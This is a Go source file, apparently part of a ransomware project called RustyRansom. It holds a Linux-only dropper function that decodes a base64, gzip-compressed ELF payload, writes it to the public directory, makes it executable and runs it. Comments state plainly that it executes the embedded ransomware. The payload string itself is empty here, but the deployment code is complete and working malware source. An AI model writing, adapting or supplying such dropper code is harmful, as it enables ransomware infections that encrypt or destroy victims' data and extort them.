//go:build linux

package main

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"io"
	"os"
	"os/exec"
	"path/filepath"

	dirs "github.com/Colocasian/dirs-go"
)

// dropper deploys the RustyRansom payload binary on Linux systems.
//
// This function is platform-specific (Linux only via //go:build linux).
// It decodes, decompresses, and executes the embedded ransomware payload.
//
// Deployment Process:
//  1. Decode Base64-encoded payload string
//  2. Decompress Gzip-compressed binary
//  3. Write to /usr/share/rustyransom (PublicDir + filename without extension)
//  4. Set executable permissions (0755)
//  5. Execute the deployed binary
//
// File Location:
//   - Path: /usr/share/rustyransom (no .exe extension on Linux)
//   - Permissions: 0755 (rwxr-xr-x) - executable by all users
//
// Payload Format:
//   - Base64 string → Gzip compressed binary → ELF executable
//
// Returns:
//   - nil: Payload successfully deployed and executed
//   - error: Failure at any stage (decode, decompress, write, chmod, exec)
//
// Security Notes:
//   - Uses public directory (/usr/share) for broader access without root
//   - Binary name has no extension (standard Unix convention)
//   - Executed synchronously - dropper waits for ransomware to complete
func dropper() error {
	// Embedded payload: Base64(Gzip(ELF binary)) - 3.2MB binary → 1.7MB encoded
	payload := ""

	// Get public directory (/usr/share on most Linux distributions)
	public_dir, err := dirs.PublicDir()

	if err != nil {
		return err
	}

	path := filepath.Join(public_dir, "rustyransom")
	file, err := os.Create(path)
	if err != nil {
		return err
	}

	// Decode Base64 payload
	decoded_payload, err := base64.StdEncoding.DecodeString(payload)
	if err != nil {
		return err
	}

	reader := bytes.NewReader(decoded_payload)
	
	// Decompress Gzip binary
	gzip, err := gzip.NewReader(reader)
	if err != nil {
		return err
	}

	binary, err := io.ReadAll(gzip)
	if err != nil {
		return err
	}

	// Write ELF binary to disk
	_, err = file.Write(binary)
	if err != nil {
		return err
	}

	err = file.Close()
	if err != nil {
		return err
	}

	// Make executable (rwxr-xr-x) - CRITICAL for Linux binary execution
	err = os.Chmod(path, 0755)
	if err != nil {
		return err
	}
	
	// Execute deployed ransomware binary
	err = exec.Command(path).Run()
	if err != nil {
		return err
	}

	return nil
}
